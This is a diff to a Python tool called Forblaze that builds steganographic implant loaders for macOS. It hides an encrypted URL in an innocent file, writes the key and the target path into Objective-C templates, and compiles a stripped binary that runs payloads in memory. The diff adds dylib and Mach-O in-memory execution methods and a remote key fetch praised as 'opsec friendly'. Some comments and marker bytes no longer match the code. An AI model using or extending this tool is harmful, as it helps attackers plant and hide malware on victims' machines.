@@ -11,10 +11,10 @@ def gen_key(length_of_key):
     key = secrets.token_bytes(length_of_key) #generate x random bytes
     bad_byte = False
 
-    if b"\xff" or b"\x00" in key: #we want to move the bytes by at least 1
+    if b"\xff" or b"\x00" in key: #we need to move the bytes by at least 1
         bad_byte = True
     
-    while(bad_byte == True): #make sure \xff is not in key, or it will shift byte back to itself, which we don't want
+    while(bad_byte == True): #make sure \xff is not in key, or it will shift byte back to itself
         key = secrets.token_bytes(length_of_key) #generate x random bytes
         bad_byte = False
 
@@ -42,6 +42,8 @@ def gen_key(length_of_key):
 def encrypt_string(string, key):
     encrypted_bytes = b""
     string_bytes = string.encode('utf-8')
+    
+    
 
     keylen = len(key) #number of bytes in the key
 
@@ -96,22 +98,22 @@ def create_stego(innocent_path, encrypted_bytes, output):
     with open(innocent_path, 'rb') as f:
         innocent_content = f.read() #get bytes of innocent file
     
-    random_int1 = secrets.randbelow(1000) #create random int below 1000.  These will be the number of padding bytes.
+    random_int1 = secrets.randbelow(1000) #create random int below 100, and above 39.  These will be padding bytes.
 
     random_bytes1 = secrets.token_bytes(random_int1)
 
-    random_int2 = secrets.randbelow(1000) #create random int below 1000.  These will be the number of padding bytes.
+    random_int2 = secrets.randbelow(1000) #create random int below 100, and above 39.  These will be padding bytes.
 
     random_bytes2 = secrets.token_bytes(random_int2)
 
-    #NOTE: These bytes can be anything you want, but IF you change them make sure to also change lines under assemble_m_file which automatically put them in compile file!!!!
-    header_bytes = b"\x59\x59\x59\x59\x59" #bytes denoting the beginning of your desired bytes
+    
+    header_bytes = b"\x59\x59\x59\x59\x59\x59" #bytes denoting the beginning of your desired bytes
     if header_bytes[0] == encrypted_bytes[0]: #make sure no overlap of encrypted and header bytes
-        header_bytes = b"\x4e\x4e\x4e\x4e\x4e"
+        header_bytes = b"\x4e\x4e\x4e\x4e\x4e\x4e"
 
-    trailing_bytes = b"\xab\xab\xab\xab\xab" #bytes at the end of your desired bytes 
+    trailing_bytes = b"\xab\xab\xab\xab\xab\xab" #bytes at the end of your desired bytes 
     if trailing_bytes[0] == encrypted_bytes[-1]: #make sure no overlap of encrypted and trailing bytes
-        trailing_bytes = b"\x97\x97\x97\x97\x97"
+        trailing_bytes = b"\x97\x97\x97\x97\x97\x97"
 
     
     #craft the stego file
@@ -125,27 +127,35 @@ def create_stego(innocent_path, encrypted_bytes, output):
     return total_size_file
 
 
-def assemble_m_file(compile_file, hex_key, stego_location):
+def assemble_m_file(compile_file, hex_key, stego_location, key_url):
 
     with open(compile_file, 'r+') as f:
         lines = f.readlines()
+        
         for x in range(0, len(lines)):
-            if "key here:" in lines[x]:
-                lines[x+1] = "unsigned char* key = \"{}\";\n".format(hex_key)
-            if "size_key here:" in lines[x]:
-                lines[x+1] = "int size_key = {};\n".format(len(hex_key)/4)
+
+            if compile_file == "compile_forblaze_method1.m" or compile_file == "compile_forblaze_method2.m": #check for compile file version, changes how key is fetched
+                if "key here:" in lines[x]:
+                    lines[x+1] = "unsigned char* key = \"{}\";\n".format(hex_key)
+                if "size_key here:" in lines[x]:
+                    lines[x+1] = "int size_key = {};\n".format(len(hex_key)/4)
+
+            if compile_file == "compile_forblaze_method3.m":
+                if "key here:" in lines[x]:  
+                    lines[x+1] = "NSString *stringURL = [NSString stringWithFormat:@\"{}\"];".format(key_url)
+            
             if "stego file location:" in lines[x]:
                 lines[x+1] = "NSString *file = [NSString stringWithFormat:@\"{}\"];\n".format(stego_location)
 
                 #can change the header offset bytes here
             if "place header offset bytes here:" in lines[x]:
-                lines[x+2] = "unsigned char header1[1] = { 0x59 };\n" 
-                lines[x+3] = "unsigned char header2[1] = { 0x4e };\n"
+                lines[x+2] = "unsigned char header1[1] = { 0x89 };\n" 
+                lines[x+3] = "unsigned char header2[1] = { 0x12 };\n"
 
                 #can change trailing offset bytes here
             if "place trail offset bytes here:" in lines[x]:
-                lines[x+2]= "unsigned char tail1[1] = { 0xab };\n"
-                lines[x+3] = "unsigned char tail2[1] = { 0x97 };\n"
+                lines[x+2]= "unsigned char tail1[1] = { 0x33 };\n"
+                lines[x+3] = "unsigned char tail2[1] = { 0xf0 };\n"
                
     with open(compile_file, 'w+') as f:
         f.writelines( lines )
@@ -155,7 +165,7 @@ def assemble_m_file(compile_file, hex_key, stego_location):
 def compile_forblaze(compile_file, compiled_binary_name):
     
     try:
-        cmd = "clang -Wl -s -fmodules {0} -o {1}".format(compile_file, compiled_binary_name)
+        cmd = "clang -Wl -s -fmodules {0} macho.c -o {1}".format(compile_file, compiled_binary_name)
         stdout = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=False)
         time.sleep(1) #give time for file to compile
 
@@ -164,10 +174,7 @@ def compile_forblaze(compile_file, compiled_binary_name):
         sys.exit()
 
     return True
-
-
-    #  MAIN FUNCTION STARTS HERE 
-def main(innocent_path, output, compile_file, url, length_key, supplied_key, stego_location, compiled_binary_name):
+def main(innocent_path, output, compile_file, url, length_key, supplied_key, stego_location, compiled_binary_name, method, key_url):
     print("****Beginning Forblaze****")
 
     if supplied_key != "":
@@ -185,7 +192,7 @@ def main(innocent_path, output, compile_file, url, length_key, supplied_key, ste
         size_file = create_stego(innocent_path, encrypted_bytes, output)
 
         print("Editing {}...".format(compile_file))
-        value = assemble_m_file(compile_file, supplied_key, stego_location)
+        value = assemble_m_file(compile_file, supplied_key, stego_location, key_url)
 
         print("Compiling {}...".format(compiled_binary_name))
         
@@ -207,7 +214,7 @@ def main(innocent_path, output, compile_file, url, length_key, supplied_key, ste
         size_file = create_stego(innocent_path, encrypted_bytes, output)
 
         print("Editing {}...".format(compile_file))
-        value = assemble_m_file(compile_file, hex_key, stego_location)
+        value = assemble_m_file(compile_file, hex_key, stego_location, key_url)
     
 
         print("Compiling {}...".format(compiled_binary_name))
@@ -220,12 +227,14 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="Generate stego for implants.")
     parser.add_argument('-innocent_path', action='store', dest="path", default="", help="Provide the full path to the innocent file to be used.")
     parser.add_argument('-o', action='store', dest="output", default="stego_file", help="Provide the path where you want your stego file to be placed.")
-    parser.add_argument('-len_key', action='store', dest="length_of_key", default=16, help="Provide a positive integer that will be the length of the key in bytes. Default is 16. Must be between 10 and 150 bytes.  You can change this yourself, just be wary that larger key sizes will add bloat to your payload and are not necessarily going to make your encryption stronger")
-    parser.add_argument('-compile_file', action='store', dest="compile_file", default="compile_forblaze.m", help="Provide the path to the C++ file you want to edit.")
+    parser.add_argument('-len_key', action='store', dest="length_of_key", default=16, help="Provide a positive integer that will be the length of the key in bytes. Default is 16. Must be between 10 and 50 bytes.")
+    #parser.add_argument('-compile_file', action='store', dest="compile_file", default="compile_forblaze.m", help="Provide the path to the C++ file you want to edit.")
     parser.add_argument('-url_to_encrypt', action='store', dest="url", default="", help="Provide the URL you want to stick inside the compile file.")
     parser.add_argument('-supply_key', action='store', dest="supplied_key", default="", help="If you wish to use a specific key, provide it here. It must be in the format: -supply_key \"\\\\x6e\\\\x60\\\\x...\" - aka two double slashes are needed between each byte, or else it WILL NOT WORK.")
     parser.add_argument('-stego_location', action='store', dest="stego_location", default="", help="You must provide a location on target where the stego file will reside.  It is wise to follow strict full paths: /Users/<>/Documents/file.jpg for example.")
     parser.add_argument('-compiled_binary', action='store', dest="compiled_binary", default="forblaze", help="Give the name of the compiled binary to extract the URL and run code in memory from the stego file.  The default is forblaze.")
+    parser.add_argument('-method', action='store', dest="method", default=1, help="Select which method you wish to use.  Method 1 relies on executing a dylib directly into memory, and works with Go payloads as well as regular payloads.  Method 2 relies on executing a macho file directly into memory, but does not work with Go compiled payloads.  Method 3 is method 1 but relies on fetchting the decrypting key over a server, which is more opsec friendly. The default method is 1. NOTE: You still might need to edit the 'module' (aka RunMain) manually depending on your execution method!")
+    parser.add_argument('-key_url', action='store', dest="key_url", default="", help="Provide the URL to the key to decrypt the stego file.")
     
     args = parser.parse_args()
 
@@ -241,8 +250,8 @@ if __name__ == '__main__':
         sys.exit()
     
 
-    elif int(args.length_of_key) < 10 or int(args.length_of_key) > 150:
-        print("You cannot supply a key length less than 10 or greater than 150 bytes.  You can change this yourself, just be wary that larger key sizes will add bloat to your payload and are not necessarily going to make your encryption stronger.")
+    elif int(args.length_of_key) < 10 or int(args.length_of_key) > 50:
+        print("You cannot supply a key length less than 10 or greater than 50 bytes.")
         parser.print_help()
         sys.exit()
 
@@ -256,5 +265,25 @@ if __name__ == '__main__':
         parser.print_help()
         sys.exit()
 
+    if int(args.method) != 1 and int(args.method) !=2 and int(args.method) !=3:
+        print("Currently only methods 1, 2, and 3 are available!")
+        parser.print_help()
+        sys.exit()
 
-    main(str(args.path), str(args.output), str(args.compile_file), str(args.url), int(args.length_of_key), str(args.supplied_key), str(args.stego_location), str(args.compiled_binary))
+    elif int(args.method) == 1:
+        compile_file = "compile_forblaze_method1.m"
+        print("Compile file selected is: {}".format(compile_file))
+
+    elif int(args.method) == 2:
+        compile_file = "compile_forblaze_method2.m"
+        print("Compile file selected is: {}".format(compile_file))
+
+    elif int(args.method) == 3:
+        if args.key_url == "":
+            print("You need to provide a url to the key to use to decrypt the stego file!")
+            sys.exit()
+
+        compile_file = "compile_forblaze_method3.m"
+        print("Compile file selected is: {}".format(compile_file))
+
+    main(str(args.path), str(args.output), str(compile_file), str(args.url), int(args.length_of_key), str(args.supplied_key), str(args.stego_location), str(args.compiled_binary), int (args.method), str(args.key_url))
